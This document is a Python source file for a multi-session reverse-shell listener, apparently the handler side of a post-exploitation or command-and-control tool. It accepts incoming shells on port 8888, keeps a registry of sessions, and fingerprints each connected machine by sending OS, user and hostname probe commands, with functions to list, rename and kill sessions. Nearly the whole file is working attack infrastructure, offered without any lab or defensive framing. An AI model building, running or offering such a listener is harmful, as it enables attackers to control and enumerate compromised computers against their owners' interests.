from __future__ import annotations

import select
import socket
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field


@dataclass
class Session:
    sid: int
    conn: socket.socket
    addr: tuple[str, int]
    os: str = "unknown"
    user: str = "?"
    host: str = "?"
    alias: str = ""
    connected_at: float = field(default_factory=time.time)
    alive: bool = True
    io_lock: threading.Lock = field(default_factory=threading.Lock)

    @property
    def label(self) -> str:
        name = self.alias or f"{self.user}@{self.host}"
        return f"#{self.sid} [{self.os.upper()}] {name} ({self.addr[0]}:{self.addr[1]})"


def drain_socket(sock: socket.socket, idle_timeout: float = 0.25, total_timeout: float = 1.5) -> bytes:
    """Read any currently buffered/arriving bytes without blocking past idle_timeout."""
    chunks: list[bytes] = []
    start = time.monotonic()
    last_data = start
    while True:
        now = time.monotonic()
        if now - start >= total_timeout:
            break
        remaining_idle = idle_timeout - (now - last_data)
        if chunks and remaining_idle <= 0:
            break
        wait = min(0.05, max(0.01, total_timeout - (now - start)))
        try:
            readable, _, _ = select.select([sock], [], [], wait)
        except (OSError, ValueError):
            break
        if readable:
            try:
                data = sock.recv(4096)
            except (BlockingIOError, OSError):
                break
            if not data:
                break
            chunks.append(data)
            last_data = time.monotonic()
        elif not chunks and now - start >= idle_timeout:
            break
    return b"".join(chunks)


def recv_until(
    sock: socket.socket,
    marker: bytes,
    activity_timeout: float = 15.0,
    max_bytes: int = 64 * 1024 * 1024,
    on_chunk: Callable[[int], None] | None = None,
) -> tuple[bytes, bool]:
    """Receive bytes until marker appears or activity_timeout elapses without data."""
    buf = bytearray()
    last_activity = time.monotonic()
    while True:
        if len(buf) >= max_bytes:
            return bytes(buf), False
        if time.monotonic() - last_activity > activity_timeout:
            return bytes(buf), False
        try:
            readable, _, _ = select.select([sock], [], [], 0.1)
        except (OSError, ValueError):
            return bytes(buf), False
        if not readable:
            continue
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            continue
        except OSError:
            return bytes(buf), False
        if not chunk:
            return bytes(buf), False
        buf.extend(chunk)
        last_activity = time.monotonic()
        if on_chunk:
            on_chunk(len(buf))
        if marker in buf:
            return bytes(buf), True


def fingerprint_session(session: Session) -> None:
    """Safely probe OS, user, and hostname using marker framing."""
    with session.io_lock:
        if not session.alive:
            return
        try:
            drain_socket(session.conn, idle_timeout=0.2, total_timeout=0.6)
            session.conn.sendall(b"uname -s 2>/dev/null || ver\n")
            raw_os = drain_socket(session.conn, idle_timeout=0.35, total_timeout=2.0).decode(errors="ignore").lower()
            if "microsoft" in raw_os or "windows" in raw_os:
                session.os = "windows"
            elif "darwin" in raw_os:
                session.os = "mac"
            else:
                session.os = "linux"

            if session.os == "windows":
                probe = b"echo __PH_ID_^S__ & whoami & hostname & echo __PH_ID_^E__\n"
            else:
                probe = b"printf '__PH_''ID_S__\\n'; whoami; hostname; printf '__PH_''ID_E__\\n'\n"

            session.conn.sendall(probe)
            raw_id, found = recv_until(session.conn, b"__PH_ID_E__", activity_timeout=3.5)
            text = raw_id.decode(errors="ignore")
            if found and "__PH_ID_S__" in text:
                segment = text.rsplit("__PH_ID_S__", 1)[-1].split("__PH_ID_E__", 1)[0]
                lines = [
                    line.strip()
                    for line in segment.splitlines()
                    if line.strip() and "__PH_ID_" not in line
                ]
                if len(lines) >= 2:
                    session.user = lines[-2]
                    session.host = lines[-1]
                elif len(lines) == 1:
                    session.user = lines[0]
        except OSError:
            session.alive = False


class SessionManager:
    """Thread-safe TCP reverse-shell listener and session registry."""

    def __init__(
        self,
        bind_host: str = "0.0.0.0",
        port: int = 8888,
        on_connect: Callable[[Session], None] | None = None,
    ):
        self.bind_host = bind_host
        self.port = port
        self.on_connect = on_connect
        self._sessions: dict[int, Session] = {}
        self._counter = 0
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._server_sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self.actual_port: int = port

    def start(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.bind_host, self.port))
        sock.listen(32)
        sock.settimeout(0.5)
        self._server_sock = sock
        self.actual_port = sock.getsockname()[1]
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self) -> None:
        assert self._server_sock is not None
        while not self._stop_event.is_set():
            try:
                conn, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            with self._lock:
                self._counter += 1
                sid = self._counter
                session = Session(sid=sid, conn=conn, addr=addr)
                self._sessions[sid] = session

            threading.Thread(target=self._init_session, args=(session,), daemon=True).start()

    def _init_session(self, session: Session) -> None:
        fingerprint_session(session)
        if self.on_connect and session.alive:
            self.on_connect(session)

    def list_sessions(self) -> list[Session]:
        with self._lock:
            return [s for s in self._sessions.values() if s.alive]

    def get(self, sid: int) -> Session | None:
        with self._lock:
            s = self._sessions.get(sid)
            return s if (s and s.alive) else None

    def rename(self, sid: int, alias: str) -> bool:
        with self._lock:
            s = self._sessions.get(sid)
            if not s or not s.alive:
                return False
            s.alias = alias.strip()
            return True

    def kill(self, sid: int) -> bool:
        with self._lock:
            s = self._sessions.get(sid)
            if not s:
                return False
            s.alive = False
            try:
                s.conn.close()
            except OSError:
                pass
            return True

    def stop(self) -> None:
        self._stop_event.set()
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass
        with self._lock:
            for s in self._sessions.values():
                s.alive = False
                try:
                    s.conn.close()
                except OSError:
                    pass
